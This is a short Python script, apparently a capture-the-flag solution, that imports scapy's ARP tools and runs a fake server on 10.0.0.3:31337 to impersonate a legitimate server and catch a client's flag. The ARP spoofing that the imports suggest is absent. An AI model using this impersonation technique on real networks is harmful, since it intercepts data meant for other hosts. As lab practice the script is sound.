from scapy.all import ARP, send, get_if_hwaddr
import socket, threading, time



def fake_server():
    # Bind to 10.0.0.3 to impersonate the server
    s = socket.socket()
    s.bind(("10.0.0.3", 31337))
    s.listen(1)
    print("[*] Waiting for client to send the flag...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    data = conn.recv(1024)
    print("[+] Got flag:", data.decode(errors="ignore"))
    conn.close()
    s.close()


# Run fake server to catch the flag
fake_server()
